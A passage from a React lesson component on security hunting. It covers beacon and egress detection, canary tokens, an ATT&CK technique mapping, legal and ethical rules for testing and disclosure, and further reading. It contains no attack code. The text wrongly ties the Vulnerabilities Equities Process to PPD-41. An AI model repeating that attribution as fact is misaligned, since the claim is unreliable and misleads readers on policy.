                <li><b>Beacon analytics:</b> look for statistical regularity in inter-request timing. <span className="eng">RITA</span> and Zeek beacon-detection.</li>
                <li><b>Identity-centric detection:</b> service identity lifecycles under watch. Accounts used every 30 days exactly = anomaly.</li>
                <li><b>Canary tokens</b> everywhere: fake banking docs, fake AWS keys in repos, mined SharePoint pages. Any access = instant alert.</li>
                <li><b>Egress baselining:</b> know normal destinations per system. Confluence shouldn&apos;t talk to the open internet. Encode it as policy.</li>
                <li><b>Hunt cadence:</b> mature teams (FBI Cyber Action Team, CISA hunt) assume the adversary is in, and search proactively every week.</li>
              </ul>
            </Callout>
            <Callout kind="info" title="MITRE ATT&CK mapping">
              Most techniques here: <span className="eng">T1190 (Exploit Public-Facing App), T1133 (External Remote Services), T1078 (Valid Accounts), T1071.001 (Web C2), T1568 (Dynamic Resolution), T1102 (Web Service), T1021 (Remote Services), T1567 (Exfil Over Web Service), T1546 (Event Triggered Execution)</span>.
            </Callout>
          </Section>

          <Section title="The legal and ethical line — read before you touch anything">
            <Callout kind="danger" title="Lines that don&apos;t move">
              <ul>
                <li><b>Never test without written authorization.</b> &quot;Public website&quot; ≠ &quot;in scope&quot;. CFAA will follow you.</li>
                <li><b>Never release a 0-day into the wild</b>, even against an adversary. If it leaks, it lands on allied infrastructure too.</li>
                <li><b>VEP (Vulnerabilities Equities Process):</b> if you find a serious 0-day, US policy (PPD-41) requires an Equities review before operational use. Don&apos;t skip it.</li>
                <li><b>Notify the affected organization</b> via the right channel (federal CIRT, CISA, or vendor) when coordinated disclosure is available.</li>
                <li><b>Document every step</b> with timestamps and authorization. Personal protection + chain-of-custody if this turns into a case.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Further reading">
            <ul>
              <li><span className="eng">&quot;A Bug Hunter&apos;s Diary&quot; — Tobias Klein</span></li>
              <li><span className="eng">Project Zero blog</span> — every report is a full case study in variant analysis</li>
              <li><span className="eng">PortSwigger Research</span> — James Kettle et al. — new web techniques annually</li>
              <li><span className="eng">CISA hunting playbooks</span> and <span className="eng">FBI/CISA joint advisories</span> — how long-haul ops are actually caught</li>
              <li><span className="eng">Mandiant M-Trends</span> annual — global dwell-time and how it&apos;s evolving</li>
              <li><span className="eng">USENIX Security &amp; IEEE S&amp;P proceedings</span> — academic work that leads industry by ~2 years</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
